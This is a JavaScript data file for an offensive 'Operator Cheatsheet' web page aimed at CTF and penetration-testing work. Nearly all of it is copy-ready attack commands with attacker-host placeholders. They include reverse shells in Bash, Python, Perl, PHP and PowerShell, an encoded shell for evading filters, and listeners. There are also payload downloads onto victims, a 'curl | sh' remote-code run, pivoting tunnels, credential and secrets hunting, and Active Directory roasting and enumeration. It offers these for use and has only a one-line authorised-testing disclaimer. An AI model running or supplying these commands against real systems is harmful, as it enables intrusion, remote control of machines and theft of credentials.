/*
  CHEATSHEET — data for cheatsheet.html

  A filterable command reference for CTF / HTB / engagement work. The renderer
  (cheatsheet-main.js) groups these into collapsible sections, adds a copy
  button to every command, live-substitutes the LHOST / LPORT boxes into any
  command containing {lhost} / {lport}, and filters as you type.

  Each group: { id, title, items: [ { label, cmd, note? } ] }
  Commands are standard operator references; {lhost}/{lport} are placeholders.

  For authorised testing and study only.
*/
var CHEATSHEET = {
  meta: {
    title: "Operator Cheatsheet",
    note: "Set LHOST / LPORT once — every command updates. Click any command to copy."
  },
  groups: [
    {
      id: "revshells", title: "Reverse Shells",
      items: [
        { label: "Bash", cmd: "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" },
        { label: "Bash (fd 196)", cmd: "0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; bash <&196 >&196 2>&196" },
        { label: "sh (mkfifo)", cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {lhost} {lport} >/tmp/f" },
        { label: "Python3", cmd: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn(\"/bin/bash\")'" },
        { label: "Perl", cmd: "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'" },
        { label: "PHP", cmd: "php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
        { label: "PowerShell", cmd: "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($sb,0,$sb.Length);$s.Flush()}\"" },
        { label: "Bash (base64)", cmd: "echo -n 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' | base64    # then: echo <b64>|base64 -d|bash", note: "encode when the target mangles characters" }
      ]
    },
    {
      id: "listeners", title: "Listeners & Shell Upgrade",
      items: [
        { label: "Netcat listener", cmd: "rlwrap nc -lvnp {lport}" },
        { label: "Pwncat (better)", cmd: "pwncat-cs -lp {lport}" },
        { label: "Upgrade to PTY", cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" },
        { label: "Stabilise (then)", cmd: "# Ctrl-Z\nstty raw -echo; fg\n# Enter, then:\nexport TERM=xterm; stty rows 40 columns 160", note: "full interactive TTY after the PTY spawn" },
        { label: "Socat full TTY (listener)", cmd: "socat file:`tty`,raw,echo=0 tcp-listen:{lport}" },
        { label: "Socat full TTY (victim)", cmd: "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}" }
      ]
    },
    {
      id: "transfer", title: "File Transfer",
      items: [
        { label: "Serve dir (HTTP)", cmd: "python3 -m http.server 8000" },
        { label: "Download (Linux)", cmd: "wget http://{lhost}:8000/file -O /tmp/file   ||   curl http://{lhost}:8000/file -o /tmp/file" },
        { label: "Download (PowerShell)", cmd: "iwr -Uri http://{lhost}:8000/file -OutFile C:\\Windows\\Temp\\file" },
        { label: "Download (certutil)", cmd: "certutil -urlcache -split -f http://{lhost}:8000/file file" },
        { label: "SMB server (impacket)", cmd: "impacket-smbserver share . -smb2support -user a -password a" },
        { label: "Mount that share (win)", cmd: "net use \\\\{lhost}\\share /u:a a   &&   copy \\\\{lhost}\\share\\file ." },
        { label: "Upload via nc", cmd: "# receiver:\nnc -lvnp 9001 > out\n# sender:\nnc {lhost} 9001 < file" },
        { label: "scp", cmd: "scp file user@{lhost}:/tmp/   # or pull: scp user@host:/path/file ." }
      ]
    },
    {
      id: "pivot", title: "Port Forwarding & Pivoting",
      items: [
        { label: "SSH local forward", cmd: "ssh -L 8080:127.0.0.1:80 user@target", note: "reach target's :80 on your :8080" },
        { label: "SSH remote forward", cmd: "ssh -R 9001:127.0.0.1:9001 user@{lhost}", note: "expose your service to the target net" },
        { label: "SSH dynamic (SOCKS)", cmd: "ssh -D 1080 user@target   # then proxychains", note: "SOCKS proxy through the pivot" },
        { label: "chisel server (you)", cmd: "./chisel server -p 8000 --reverse" },
        { label: "chisel client (target)", cmd: "./chisel client {lhost}:8000 R:socks" },
        { label: "ligolo-ng (you)", cmd: "./proxy -selfcert   # add route to target subnet via the tun" },
        { label: "proxychains", cmd: "proxychains -q nmap -sT -Pn -n <target>   # over the SOCKS tunnel" }
      ]
    },
    {
      id: "win-enum", title: "Windows Enumeration",
      items: [
        { label: "Who am I / privs", cmd: "whoami /all   &&   whoami /priv" },
        { label: "System info", cmd: "systeminfo   &&   wmic qfe get HotFixID   # patch level" },
        { label: "Users & groups", cmd: "net user   &&   net localgroup administrators   &&   query user" },
        { label: "Services (weak)", cmd: "sc query   &&   wmic service get name,pathname,startname | findstr /i /v \"C:\\Windows\"" },
        { label: "Scheduled tasks", cmd: "schtasks /query /fo LIST /v" },
        { label: "Stored creds hunt", cmd: "findstr /si password *.xml *.ini *.config   &&   cmdkey /list" },
        { label: "Run WinPEAS", cmd: "winpeas.exe quiet cmd fast" }
      ]
    },
    {
      id: "lin-enum", title: "Linux Enumeration",
      items: [
        { label: "Who / sudo", cmd: "id   &&   sudo -l" },
        { label: "SUID binaries", cmd: "find / -perm -4000 -type f 2>/dev/null", note: "cross-check each against GTFOBins" },
        { label: "Capabilities", cmd: "getcap -r / 2>/dev/null" },
        { label: "Cron jobs", cmd: "cat /etc/crontab; ls -la /etc/cron.*; crontab -l" },
        { label: "Writable by me", cmd: "find / -writable -type d 2>/dev/null | grep -v proc" },
        { label: "Secrets hunt", cmd: "grep -RniE 'password|secret|api[_-]?key' /var/www /home /opt /etc 2>/dev/null | head" },
        { label: "Run LinPEAS", cmd: "curl http://{lhost}:8000/linpeas.sh | sh" }
      ]
    },
    {
      id: "ad", title: "SMB / AD (enumeration — no brute force)",
      items: [
        { label: "SMB null shares", cmd: "nxc smb <target> -u '' -p '' --shares   &&   smbclient -N -L //<target>/" },
        { label: "RID brute", cmd: "nxc smb <target> -u 'guest' -p '' --rid-brute" },
        { label: "Kerbrute userenum", cmd: "kerbrute userenum -d <domain> --dc <target> users.txt" },
        { label: "AS-REP roast (no creds)", cmd: "GetNPUsers.py <domain>/ -no-pass -usersfile users.txt -dc-ip <target>" },
        { label: "LDAP rootDSE", cmd: "ldapsearch -x -H ldap://<target> -s base namingcontexts" },
        { label: "BloodHound collect", cmd: "bloodhound-python -d <domain> -u <user> -p <pass> -ns <target> -c all" },
        { label: "Evil-WinRM", cmd: "evil-winrm -i <target> -u <user> -p <pass>" }
      ]
    },
    {
      id: "web", title: "Web / Content Discovery",
      items: [
        { label: "ffuf directories", cmd: "ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac" },
        { label: "ffuf vhosts", cmd: "ffuf -u http://<target>/ -H 'Host: FUZZ.<domain>' -w subdomains.txt -ac" },
        { label: "feroxbuster recursive", cmd: "feroxbuster -u http://<target> -w wordlist.txt -x php,txt" },
        { label: "Headers / methods", cmd: "curl -skIL http://<target>/   &&   curl -skX OPTIONS http://<target>/ -i" },
        { label: "SSTI probe", cmd: "?name={{7*7}}   # 49 in response => template injection" },
        { label: "nuclei scan", cmd: "nuclei -u http://<target> -severity low,medium,high,critical" }
      ]
    }
  ]
};
